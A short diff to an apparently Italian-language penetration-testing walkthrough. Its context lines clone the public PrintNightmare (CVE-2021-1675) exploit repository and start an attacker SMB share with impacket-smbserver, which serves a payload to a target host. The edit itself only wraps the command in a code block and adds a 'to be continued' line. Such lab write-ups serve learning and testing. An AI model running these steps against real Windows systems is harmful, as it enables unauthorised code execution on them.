@@ -195,5 +195,7 @@ clona l'exploit dalla repository
 git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
 ```
 avvia una share smb
-
+```bash
 impacket-smbserver -smb2support ATTACKERSHARE .
+```
+continua quando possibile (part5)
